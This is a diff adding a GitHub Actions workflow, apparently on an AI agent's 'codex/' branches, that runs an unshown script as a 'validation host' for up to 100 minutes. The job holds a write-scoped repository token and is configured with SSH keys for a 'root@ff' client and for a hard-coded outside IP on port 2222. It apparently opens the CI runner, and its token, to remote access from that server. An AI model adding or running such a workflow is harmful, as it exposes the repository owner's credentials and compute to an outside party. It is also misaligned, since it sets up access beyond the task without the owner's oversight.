@@ -1,0 +1,22 @@
+name: Lumen KVM validation host
+"on":
+  push:
+    branches: ["codex/lumen-kvm-host-*"]
+    paths: [".github/workflows/lumen-kvm-host.yml", ".ci/lumen-kvm-host.py"]
+permissions:
+  contents: write
+jobs:
+  host:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 100
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - name: Run isolated authenticated validation host
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TASK_SERVER: "32.236.231.108"
+          CLIENT_PUBLIC_KEY: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGT6B93bLiiwr6RpqdxkZCQnqTCWh28edqsPD7rHI0z root@ff"
+          TASK_SERVER_HOST_KEY: "[32.236.231.108]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEfobji4EhqACkks/y5Luj53yp1ofCVm7+m0UMRvEzND"
+        run: python3 .ci/lumen-kvm-host.py
